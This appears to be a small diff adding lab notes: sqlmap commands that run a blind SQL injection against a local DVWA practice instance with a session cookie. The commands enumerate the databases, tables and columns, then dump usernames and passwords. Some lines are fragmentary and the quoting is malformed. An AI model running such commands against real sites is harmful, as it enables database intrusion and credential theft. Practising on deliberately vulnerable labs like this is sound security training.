@@ -1,0 +1,5 @@
+sqlmap -u "http://192.168.1.102/DVWA-1.0.8/vulnerabilities/sqli_blind/?id=1&submit#'--cookie="security=low;PHPSESSID=k14s793jghpn7tec2pnjojv1j3" --dbs
+-D
+-T user --column
+-D dvwa --tables
+-C user,password,name --dump
